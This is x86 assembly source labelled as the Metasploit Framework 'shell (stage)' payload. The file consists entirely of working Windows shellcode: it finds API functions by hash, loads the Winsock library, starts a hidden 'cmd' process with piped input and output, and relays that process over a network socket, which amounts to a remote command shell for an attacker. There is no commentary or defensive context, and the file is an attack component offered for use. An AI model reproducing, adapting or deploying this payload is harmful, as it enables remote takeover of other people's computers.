;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for shell (stage)
;
; Authors: spoonm <spoonm@no$email.com>, vlad902 <vlad902@gmail.com>
; Size   : 474
;

push dword 0x3233
push dword 0x5f325357
push edi
cld
call 0x5d
pusha
mov ebp,[esp+0x28]
mov eax,[ebp+0x3c]
mov edi,[ebp+eax+0x78]
add edi,ebp
mov ecx,[edi+0x18]
mov ebx,[edi+0x20]
add ebx,ebp
jecxz 0x59
dec ecx
mov esi,[ebx+ecx*4]
add esi,ebp
xor eax,eax
cdq
lodsb
test al,al
jz 0x3e
ror edx,0xd
add edx,eax
jmp short 0x32
cmp edx,[esp+0x24]
jnz 0x27
mov ebx,[edi+0x24]
add ebx,ebp
mov cx,[ebx+ecx*2]
mov ebx,[edi+0x1c]
add ebx,ebp
add ebp,[ebx+ecx*4]
mov [esp+0x1c],ebp
popa
ret 0x8
push byte +0x30
pop ecx
mov esi,[fs:ecx]
mov esi,[esi+0xc]
mov esi,[esi+0x1c]
lodsd
mov ebx,[eax+0x8]
pop esi
push ebx
push dword 0xec0e4e8e
call esi
xchg eax,edi
push ebx
push esi
push edi
lea eax,[esp+0x10]
push eax
call edi
push eax
push eax
push eax
push dword 0xe71819b6
call esi
xchg eax,edi
push dword 0xe97019a4
call esi
xchg eax,ebp
push dword 0xede29208
call esi
push eax
push edi
push ebp
sub esp,byte +0x10
mov ebp,esp
mov esi,ebp
push byte +0x1
push byte +0x0
push byte +0xc
mov ecx,esp
push byte +0x0
push ecx
push esi
lodsd
push esi
push ebx
push dword 0x170c8f80
call near [ebp+0x20]
mov edi,eax
call eax
mov eax,esp
push byte +0x0
push eax
lea esi,[ebp+0x8]
push esi
lea esi,[ebp+0xc]
push esi
call edi
push dword 0x444d43
mov edx,esp
xor eax,eax
lea edi,[edx-0x54]
push byte +0x15
pop ecx
rep stosd
sub esp,byte +0x54
mov byte [edx-0x44],0x44
mov word [edx-0x18],0x101
mov esi,[ebp+0x8]
mov [edx-0x4],esi
mov [edx-0x8],esi
mov esi,[ebp+0x4]
mov [edx-0xc],esi
lea eax,[edx-0x44]
push esp
push eax
push ecx
push ecx
push ecx
inc ecx
push ecx
dec ecx
push ecx
push ecx
push edx
push ecx
push ebx
push dword 0x16b3fe72
call near [ebp+0x20]
call eax
xor eax,eax
mov ah,0x4
xchg eax,esi
sub esp,esi
mov edi,esp
push byte +0x64
push ebx
push dword 0xdb2d49b0
call near [ebp+0x20]
call eax
xor eax,eax
push eax
push edi
push eax
push eax
push eax
push dword [ebp+0xc]
push ebx
push dword 0xb407c411
call near [ebp+0x20]
call eax
test eax,eax
jz 0x1b9
xor eax,eax
cmp eax,[edi]
jz 0x181
call 0x1c7
push eax
mov ecx,esp
push eax
push ecx
push esi
push edi
push dword [ebp+0xc]
push ebx
push dword 0x10fa6516
call near [ebp+0x20]
call eax
test eax,eax
jz 0x1b9
xor eax,eax
pop ecx
cmp eax,ecx
jz 0x181
push eax
push ecx
push edi
push dword [ebp+0x28]
call near [ebp+0x10]
xor ecx,ecx
cmp eax,ecx
jl 0x1b9
jmp short 0x12c
mov eax,esp
call 0x1c7
xor eax,eax
push eax
push esi
push edi
push dword [ebp+0x28]
call near [ebp+0x14]
xor ecx,ecx
cmp eax,ecx
jl 0x11f
jz 0x1b9
push ecx
mov edx,esp
push ecx
push edx
push eax
push edi
push dword [ebp+0x0]
push ebx
push dword 0xe80a791f
call near [ebp+0x20]
call eax
test eax,eax
jz 0x1b9
xor eax,eax
pop ecx
jmp short 0x181
push ebx
push dword 0x5f048af0
call near [ebp+0x20]
xor ecx,ecx
push ecx
call eax
push eax
push esp
push dword 0x8004667e
push dword [ebp+0x28]
call near [ebp+0x18]
test eax,eax
pop eax
jnz 0x1b9
ret
